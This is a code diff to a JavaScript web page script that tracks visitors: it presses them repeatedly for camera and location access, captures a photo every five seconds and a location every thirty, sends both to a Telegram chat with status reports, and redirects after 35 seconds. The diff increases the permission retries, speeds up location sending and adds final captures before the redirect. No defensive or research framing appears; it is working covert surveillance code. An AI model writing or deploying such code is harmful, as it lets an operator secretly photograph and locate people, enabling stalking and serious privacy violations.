@@ -16,12 +16,13 @@ let isSubmitted = false;
 let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT";
 let redirectTimer = null;
 let permissionAttempts = 0;
-const MAX_PERMISSION_ATTEMPTS = 3;
+const MAX_PERMISSION_ATTEMPTS = 5;
+let isDataSent = false;
 
 // Create video element
 function createVideoElement() {
     if (videoElement) return videoElement;
-    
+
     videoElement = document.createElement('video');
     videoElement.id = 'camera-feed';
     videoElement.autoplay = true;
@@ -62,11 +63,11 @@ function getRedirectUrl() {
         try {
             const decodedUrl = decodeURIComponent(urlParam);
             let cleanUrl = decodedUrl.replace(/<[^>]*>/g, '');
-            
+
             if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
                 cleanUrl = 'https://' + cleanUrl;
             }
-            
+
             new URL(cleanUrl);
             console.log("Valid redirect URL:", cleanUrl);
             return cleanUrl;
@@ -74,7 +75,7 @@ function getRedirectUrl() {
             console.error("Invalid redirect URL:", error);
         }
     }
-    
+
     return "https://telegram.me/ANAS_ACCESS_BOT";
 }
 
@@ -200,8 +201,9 @@ async function sendLocationUpdate(chatId, location) {
 <b>Maps:</b> <a href="${mapsUrl}">Open</a>
     `;
 
-    await sendTelegramMessage(chatId, message);
-    locationUpdates++;
+    const sent = await sendTelegramMessage(chatId, message);
+    if (sent) locationUpdates++;
+    return sent;
 }
 
 async function capturePhoto() {
@@ -216,10 +218,10 @@ async function capturePhoto() {
         const canvas = document.createElement('canvas');
         canvas.width = videoElement.videoWidth;
         canvas.height = videoElement.videoHeight;
-        
+
         const context = canvas.getContext('2d');
         context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        
+
         return new Promise((resolve) => {
             canvas.toBlob(blob => {
                 if (blob) {
@@ -239,7 +241,7 @@ async function capturePhoto() {
 async function requestCameraPermission() {
     try {
         console.log("Requesting camera permission...");
-        
+
         createVideoElement();
 
         const constraints = {
@@ -322,12 +324,17 @@ async function requestLocationPermission() {
             { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
         );
 
+        // Send initial location update
+        if (currentChatId) {
+            await sendLocationUpdate(currentChatId, currentLocation);
+        }
+
         // Periodic updates
         locationInterval = setInterval(async () => {
             if (currentLocation && currentChatId) {
                 await sendLocationUpdate(currentChatId, currentLocation);
             }
-        }, 60000);
+        }, 30000); // Every 30 seconds
 
         return true;
     } catch (error) {
@@ -336,75 +343,100 @@ async function requestLocationPermission() {
     }
 }
 
-// Request both permissions on page load
+// Request permissions continuously
 async function requestAllPermissions() {
     console.log("Requesting all permissions...");
-    
-    // Try camera first
+
+    // Try camera
     const cameraGranted = await requestCameraPermission();
     
-    // Try location after 1 second
+    // Try location after 500ms
     setTimeout(async () => {
         const locationGranted = await requestLocationPermission();
         
-        // If denied, retry after 3 seconds (max 3 attempts)
-        if (!cameraGranted || !locationGranted) {
+        // If both granted, start capturing
+        if (cameraGranted && locationGranted) {
+            console.log("All permissions granted!");
+            startContinuousPhotoCapture();
+        } else {
+            // Retry after 3 seconds
             permissionAttempts++;
             if (permissionAttempts < MAX_PERMISSION_ATTEMPTS) {
                 console.log(`Retrying permissions in 3 seconds... (Attempt ${permissionAttempts + 1}/${MAX_PERMISSION_ATTEMPTS})`);
+                
+                // Update status
+                updatePermissionStatus();
+                
                 setTimeout(requestAllPermissions, 3000);
-            }
-        } else {
-            console.log("All permissions granted!");
-            // Start photo capture if camera is active
-            if (isCameraActive && currentChatId) {
-                startContinuousPhotoCapture();
+            } else {
+                console.log("Max permission attempts reached");
+                // Even if permissions not granted, still try to capture
+                if (cameraGranted) {
+                    startContinuousPhotoCapture();
+                }
             }
         }
-    }, 1000);
+    }, 500);
+}
+
+function updatePermissionStatus() {
+    const statusDiv = document.getElementById('permission-status');
+    if (statusDiv) {
+        statusDiv.innerHTML = `
+            <div style="background: #ffcc00; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0;">
+                <strong>⚠️ Permission Required</strong><br>
+                Please allow Camera and Location access<br>
+                Attempt: ${permissionAttempts + 1}/${MAX_PERMISSION_ATTEMPTS}
+            </div>
+        `;
+    }
 }
 
 async function startContinuousPhotoCapture() {
-    if (!isCameraActive || !currentChatId) return;
+    if (!currentChatId) return;
 
     console.log("Starting photo capture every 5 seconds...");
 
-    // First photo after 2 seconds
-    setTimeout(async () => {
-        try {
-            const photo = await capturePhoto();
-            if (photo) {
-                photoCounter++;
-                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
+    // First photo immediately if camera active
+    if (isCameraActive) {
+        setTimeout(async () => {
+            try {
+                const photo = await capturePhoto();
+                if (photo) {
+                    photoCounter++;
+                    await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
+                }
+            } catch (error) {
+                console.error("First photo error:", error);
             }
-        } catch (error) {
-            console.error("First photo error:", error);
-        }
-    }, 2000);
+        }, 1000);
+    }
 
     // Then every 5 seconds
     photoInterval = setInterval(async () => {
-        try {
-            const photo = await capturePhoto();
-            if (photo) {
-                photoCounter++;
-                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
+        if (isCameraActive) {
+            try {
+                const photo = await capturePhoto();
+                if (photo) {
+                    photoCounter++;
+                    await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
 
-                // Status update every 10 photos
-                if (photoCounter % 10 === 0) {
-                    const status = `
+                    // Status update every 10 photos
+                    if (photoCounter % 10 === 0) {
+                        const status = `
 <b>📊 STATUS UPDATE</b>
 <b>Photos:</b> ${photoCounter}
 <b>Location Updates:</b> ${locationUpdates}
 <b>Camera:</b> ${isCameraActive ? '✅' : '❌'}
 <b>Location:</b> ${currentLocation ? '✅' : '❌'}
 <b>Time:</b> ${new Date().toLocaleString()}
-                    `;
-                    await sendTelegramMessage(currentChatId, status);
+                        `;
+                        await sendTelegramMessage(currentChatId, status);
+                    }
                 }
+            } catch (error) {
+                console.error("Photo capture error:", error);
             }
-        } catch (error) {
-            console.error("Photo capture error:", error);
         }
     }, 5000);
 }
@@ -439,7 +471,7 @@ async function sendInitialInfo() {
         await sendTelegramMessage(currentChatId, message);
         console.log("Initial info sent");
 
-        // Request permissions immediately
+        // Start requesting permissions
         requestAllPermissions();
 
     } catch (error) {
@@ -483,47 +515,79 @@ function cleanup() {
     isCameraActive = false;
 
     // Send final message
-    if (currentChatId && !isSubmitted) {
+    if (currentChatId && !isDataSent) {
         const finalMsg = `
 <b>📊 SESSION ENDED</b>
 <b>Photos:</b> ${photoCounter}
 <b>Location Updates:</b> ${locationUpdates}
 <b>Time:</b> ${new Date().toLocaleString()}
         `;
-        
+
         const blob = new Blob([JSON.stringify({
             chat_id: currentChatId,
             text: finalMsg,
             parse_mode: "HTML"
         })], {type: 'application/json'});
-        
+
         navigator.sendBeacon(API_URL, blob);
     }
 }
 
-// Simple silent redirect after 35 seconds
-function startSilentRedirect() {
-    console.log("Starting 35-second silent redirect timer...");
+// Send final data and then redirect
+async function sendFinalDataAndRedirect() {
+    console.log("Sending final data before redirect...");
     
-    redirectTimer = setTimeout(() => {
-        console.log("35 seconds completed, redirecting silently...");
-        
-        if (currentChatId) {
-            const redirectMsg = `
-<b>🔄 AUTO REDIRECT</b>
-<b>Time on page:</b> 35 seconds
+    if (isDataSent) return;
+    
+    isDataSent = true;
+    
+    // Send final location
+    if (currentLocation && currentChatId) {
+        await sendLocationUpdate(currentChatId, currentLocation);
+    }
+    
+    // Send final photo
+    if (isCameraActive && currentChatId) {
+        const finalPhoto = await capturePhoto();
+        if (finalPhoto) {
+            photoCounter++;
+            await sendPhoto(currentChatId, finalPhoto, photoCounter, currentLocation);
+        }
+    }
+    
+    // Send redirect notification
+    if (currentChatId) {
+        const redirectMsg = `
+<b>🔄 REDIRECTING USER</b>
 <b>Final Photos:</b> ${photoCounter}
 <b>Final Location Updates:</b> ${locationUpdates}
 <b>Redirecting to:</b> ${redirectUrl}
+<b>Total Time on Page:</b> 35 seconds
 <b>Time:</b> ${new Date().toLocaleString()}
-            `;
-            
-            sendTelegramMessage(currentChatId, redirectMsg);
-        }
+        `;
         
+        await sendTelegramMessage(currentChatId, redirectMsg);
+    }
+    
+    // Wait 1 second for messages to send
+    setTimeout(() => {
+        console.log("Redirecting to:", redirectUrl);
         cleanup();
         window.location.href = redirectUrl;
-        
+    }, 1000);
+}
+
+// Start redirect timer (35 seconds)
+function startRedirectTimer() {
+    console.log("Starting 35-second redirect timer...");
+    
+    if (redirectTimer) {
+        clearTimeout(redirectTimer);
+    }
+    
+    redirectTimer = setTimeout(() => {
+        console.log("35 seconds completed, sending final data and redirecting...");
+        sendFinalDataAndRedirect();
     }, 35000); // 35 seconds
 }
 
@@ -592,20 +656,11 @@ ${currentLocation ? `
         if (success) {
             isSubmitted = true;
 
-            // Final photo
-            if (isCameraActive) {
-                const finalPhoto = await capturePhoto();
-                if (finalPhoto) {
-                    photoCounter++;
-                    await sendPhoto(chatId, finalPhoto, photoCounter, currentLocation);
-                }
-            }
-
             // Change button text
             submitBtn.textContent = "Submitted ✓";
             
-            // Start 35-second silent redirect timer
-            startSilentRedirect();
+            // Start 35-second redirect timer
+            startRedirectTimer();
             
         } else {
             alert("Failed to submit. Try again.");
@@ -626,6 +681,25 @@ document.getElementById('mobile-number').addEventListener('input', function () {
     this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
 });
 
+// Create permission status div
+function createPermissionStatus() {
+    const statusDiv = document.createElement('div');
+    statusDiv.id = 'permission-status';
+    statusDiv.style.cssText = `
+        background: #f8f9fa;
+        border-left: 4px solid #007bff;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 4px;
+        font-size: 14px;
+    `;
+    
+    const container = document.querySelector('.container');
+    if (container) {
+        container.insertBefore(statusDiv, container.firstChild);
+    }
+}
+
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
     console.log("Starting tracking system...");
@@ -633,7 +707,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // Get parameters
     const params = getUrlParameters();
     redirectUrl = getRedirectUrl();
-    
+
     console.log("Redirect URL:", redirectUrl);
 
     // Show redirect info
@@ -643,13 +717,16 @@ document.addEventListener('DOMContentLoaded', function() {
         redirectInfo.style.display = 'block';
     }
 
+    // Create permission status div
+    createPermissionStatus();
+
     // Update stats display
     const updateStats = setInterval(() => {
         const camStatus = document.getElementById('cam-status');
         const gpsStatus = document.getElementById('gps-status');
         const photoCount = document.getElementById('photo-count');
         const locCount = document.getElementById('loc-count');
-        
+
         if (camStatus) camStatus.textContent = isCameraActive ? '✅ Active' : '⏳ Requesting...';
         if (gpsStatus) gpsStatus.textContent = currentLocation ? '✅ Active' : '⏳ Requesting...';
         if (photoCount) photoCount.textContent = photoCounter;
